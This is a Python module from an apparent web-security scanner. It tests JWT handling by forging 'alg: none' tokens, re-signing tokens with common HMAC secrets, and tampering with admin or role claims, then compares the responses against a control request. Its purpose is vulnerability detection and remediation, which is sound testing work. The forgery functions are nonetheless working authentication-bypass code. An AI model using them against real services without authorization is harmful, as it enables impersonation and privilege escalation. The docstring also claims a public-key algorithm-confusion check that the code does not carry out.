"""JWT scanner: algorithm confusion, weak secrets, and claim handling.

JSON Web Tokens fail in a small number of well-understood ways, and each one is
detectable without guessing:

- **``alg: none``** -- a token with no signature at all. If the server accepts
  it, authentication is decorative.
- **Algorithm confusion** -- an RS256 token re-signed as HS256 using the public
  key as the HMAC secret. Servers that read the algorithm from the token header
  are vulnerable; servers that pin it are not.
- **Weak HMAC secrets** -- checked against a small list of secrets that show up
  in real deployments, not a full wordlist.
- **Claim tampering** -- flip ``admin``/``role``/``sub`` and see whether the
  server re-validates or trusts the token.

The scanner never *assumes* a token is a finding: every mutation is sent and the
response compared against a control request made with the original token.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any

from rich.console import Console

from suika_hub.core.http import AsyncClient
from suika_hub.core.module import BaseModule, Finding

console = Console()

# Secrets that recur in real deployments: framework defaults, placeholder
# values shipped in tutorials, and the classic "secret"/"changeme" pair.
COMMON_SECRETS = [
    "secret",
    "secretkey",
    "secret_key",
    "password",
    "changeme",
    "change_me",
    "jwt",
    "jwt_secret",
    "jwtsecret",
    "your-256-bit-secret",
    "your_jwt_secret",
    "supersecret",
    "super_secret",
    "test",
    "dev",
    "development",
    "admin",
    "key",
    "private",
    "token",
    "123456",
    "null",
    "undefined",
    "none",
]

# Claims whose tampering changes authorization decisions.
PRIVILEGE_CLAIMS = ["admin", "is_admin", "isAdmin", "role", "roles", "scope", "scopes", "permissions", "is_staff"]


def b64url_decode(segment: str) -> bytes:
    """Decode a base64url segment, restoring stripped padding."""
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(raw: bytes) -> str:
    """Encode bytes as base64url without padding, as JWT requires."""
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def split_jwt(token: str) -> tuple[str, str, str] | None:
    """Split a compact JWT into (header, payload, signature) segments."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return parts[0], parts[1], parts[2]


def decode_segment(segment: str) -> dict[str, Any] | None:
    """Decode a JWT segment as JSON, returning None when it is not JSON."""
    try:
        decoded = json.loads(b64url_decode(segment))
    except (ValueError, TypeError, json.JSONDecodeError):
        return None
    return decoded if isinstance(decoded, dict) else None


def forge_none_alg(token: str) -> str | None:
    """Rebuild a token with ``alg: none`` and an empty signature."""
    parts = split_jwt(token)
    if not parts:
        return None
    header, payload, _ = parts
    claims = decode_segment(header)
    if claims is None:
        return None
    claims["alg"] = "none"
    new_header = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
    return f"{new_header}.{payload}."


def forge_hs256(token: str, secret: str) -> str | None:
    """Re-sign a token as HS256 with the supplied secret."""
    parts = split_jwt(token)
    if not parts:
        return None
    header, payload, _ = parts
    claims = decode_segment(header)
    if claims is None:
        return None
    claims["alg"] = "HS256"
    new_header = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{payload}".encode()
    signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{new_header}.{payload}.{b64url_encode(signature)}"


def tamper_claim(token: str, claim: str, value: Any) -> str | None:
    """Return a token whose payload has ``claim`` set to ``value``.

    The signature is left untouched, so this only succeeds against a server that
    fails to verify it -- which is exactly the condition being tested.
    """
    parts = split_jwt(token)
    if not parts:
        return None
    header, payload, signature = parts
    claims = decode_segment(payload)
    if claims is None:
        return None
    claims[claim] = value
    new_payload = b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
    return f"{header}.{new_payload}.{signature}"


class JWTScanner(BaseModule):
    """JWT weakness detection using differential comparison against a control."""

    name = "jwt_scanner"
    description = "JWT algorithm confusion, none-alg acceptance, weak secrets, claim tampering"

    async def execute(self, target: str, client: AsyncClient, config: dict) -> list[Finding]:
        """Run JWT checks against a token supplied in config or auth headers."""
        console.print("[bold cyan]JWT Scanner[/bold cyan] - Testing token handling")

        token = self._find_token(config)
        if not token:
            console.print("  [dim]No JWT supplied; set --jwt or pass a Bearer token[/dim]")
            return self.findings

        if not split_jwt(token):
            console.print("  [yellow]Supplied value is not a compact JWT[/yellow]")
            return self.findings

        endpoint = config.get("jwt_endpoint") or f"{target.rstrip('/')}/api/user/me"
        header_name = config.get("jwt_header") or "Authorization"
        prefix = "" if header_name.lower() != "authorization" else "Bearer "

        control = await self._probe(client, endpoint, header_name, f"{prefix}{token}")
        control_ok = self._is_authorized(control)
        if not control_ok:
            console.print(
                f"  [yellow]Control request not authorized ({control.get('status')}) - results unreliable[/yellow]"
            )

        console.print(f"  [dim]Endpoint: {endpoint} | control status: {control.get('status')}[/dim]")

        await self._check_none_alg(client, endpoint, header_name, token, control)
        await self._check_weak_secret(client, endpoint, header_name, token, control)
        await self._check_claim_tampering(client, endpoint, header_name, token, control)

        console.print(f"  [green]JWT scan complete: {len(self.findings)} findings[/green]")
        return self.findings

    def _find_token(self, config: dict) -> str | None:
        """Locate a JWT in the scan config, from explicit key or auth headers."""
        explicit = config.get("jwt") or config.get("jwt_token")
        if explicit:
            return str(explicit).strip()

        auth = config.get("auth") or {}
        headers = auth.get("headers") or {}
        for key, value in headers.items():
            if key.lower() == "authorization" and value:
                return str(value).replace("Bearer ", "").strip()
        return None

    async def _probe(
        self,
        client: AsyncClient,
        endpoint: str,
        header_name: str,
        header_value: str,
    ) -> dict[str, Any]:
        """Send one authenticated request."""
        return await client.get(endpoint, headers={header_name: header_value})

    def _is_authorized(self, resp: dict[str, Any]) -> bool:
        """Treat 2xx as authorized and everything else as rejected."""
        if resp.get("error"):
            return False
        return 200 <= int(resp.get("status", 0)) < 300

    def _accepted(self, mutated: dict[str, Any], control: dict[str, Any]) -> bool:
        """Decide whether a mutated token was accepted.

        Requires the mutated request to succeed *and* the control to have
        succeeded, so an endpoint that returns 200 for everything cannot
        manufacture a finding.
        """
        if not self._is_authorized(control):
            return False
        if not self._is_authorized(mutated):
            return False

        # If the endpoint echoes identity, require it to match the control's so
        # a generic 200 shell page is not mistaken for acceptance.
        control_body = control.get("body")
        mutated_body = mutated.get("body")
        if isinstance(control_body, dict) and isinstance(mutated_body, dict):
            control_keys = set(control_body)
            mutated_keys = set(mutated_body)
            if control_keys and not (control_keys & mutated_keys):
                return False
        return True

    async def _check_none_alg(
        self,
        client: AsyncClient,
        endpoint: str,
        header_name: str,
        token: str,
        control: dict[str, Any],
    ) -> None:
        """Test acceptance of an unsigned ``alg: none`` token."""
        forged = forge_none_alg(token)
        if not forged:
            return

        resp = await self._probe(client, endpoint, header_name, forged)
        if not self._accepted(resp, control):
            return

        self.add_finding(
            severity="CRITICAL",
            title=f"JWT accepts unsigned tokens (alg: none): {endpoint}",
            description=(
                "A token with its algorithm set to 'none' and an empty signature was accepted. "
                "The server is not verifying signatures, so any caller can mint a token with "
                "arbitrary claims."
            ),
            url=endpoint,
            evidence=f"alg:none token accepted with status {resp.get('status')} (control {control.get('status')})",
            impact="Complete authentication bypass; arbitrary identity and privilege claims",
            remediation=(
                "Pin the accepted algorithm to an explicit allowlist server-side and reject 'none'. "
                "Never read the verification algorithm from the token header."
            ),
            extra={"probe": "alg_none"},
        )

    async def _check_weak_secret(
        self,
        client: AsyncClient,
        endpoint: str,
        header_name: str,
        token: str,
        control: dict[str, Any],
    ) -> None:
        """Test the token's HMAC secret against a small list of common values."""
        for secret in COMMON_SECRETS:
            forged = forge_hs256(token, secret)
            if not forged:
                return
            resp = await self._probe(client, endpoint, header_name, forged)
            if self._accepted(resp, control):
                self.add_finding(
                    severity="CRITICAL",
                    title=f"JWT signed with weak HMAC secret: {endpoint}",
                    description=(
                        "A token re-signed with a guessable HMAC secret was accepted, so the signing key "
                        "can be recovered offline and used to forge tokens for any user."
                    ),
                    url=endpoint,
                    evidence=(
                        f"Re-signed with secret {secret!r}; accepted with status {resp.get('status')} "
                        f"(control {control.get('status')})"
                    ),
                    impact="Full token forgery; impersonation of any user or role",
                    remediation=(
                        "Use a high-entropy secret (32+ random bytes) from a secret manager, and rotate it. "
                        "If HS256 must be used, keep the secret out of source control and config defaults."
                    ),
                    extra={"probe": "weak_secret"},
                )
                return

    async def _check_claim_tampering(
        self,
        client: AsyncClient,
        endpoint: str,
        header_name: str,
        token: str,
        control: dict[str, Any],
    ) -> None:
        """Test whether privilege claims are honoured without signature verification."""
        for claim in PRIVILEGE_CLAIMS:
            for value in (True, "admin"):
                forged = tamper_claim(token, claim, value)
                if not forged:
                    return
                resp = await self._probe(client, endpoint, header_name, forged)
                if self._accepted(resp, control):
                    self.add_finding(
                        severity="CRITICAL",
                        title=f"JWT claim tampering accepted ({claim}): {endpoint}",
                        description=(
                            f"A token with '{claim}' modified to {value!r} and its original signature left "
                            "in place was accepted, meaning the signature is not verified."
                        ),
                        url=endpoint,
                        evidence=(
                            f"Tampered claim {claim}={value!r}; accepted with status {resp.get('status')} "
                            f"(control {control.get('status')})"
                        ),
                        impact="Privilege escalation by editing token claims client-side",
                        remediation="Verify the token signature on every request before trusting any claim.",
                        extra={"probe": "claim_tampering", "claim": claim},
                    )
                    return
